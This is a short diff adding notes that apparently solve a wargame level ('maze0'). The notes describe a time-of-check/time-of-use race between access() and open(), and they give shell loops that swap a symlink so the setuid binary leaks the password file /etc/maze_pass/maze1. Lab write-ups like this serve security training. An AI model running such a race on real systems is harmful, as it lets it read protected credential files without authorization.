@@ -1,0 +1,16 @@
+
+
+checks permissions on /tmp/128ecf542a35ac5270a87dc740918404 to make sure they are read only with access(2)
+
+opens file with different permissions open(path, 0)
+writes the output to stdout 
+
+touch /tmp/cyberatuc/my_file.txt
+chmod 400 /tmp/cyberatuc/my_file.txt
+while [ 1 ]; do /maze/maze0 | tee -a /tmp/cyberatuc/answer; done
+"In a different session"
+while [ 1 ]; do ln -sfT /tmp/cyberatuc/my_file.txt /tmp/128ecf542a35ac5270a87dc740918404; ln -sfT /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404; done
+
+
+tail -f /tmp/cyberatuc/answer
+hashaachon
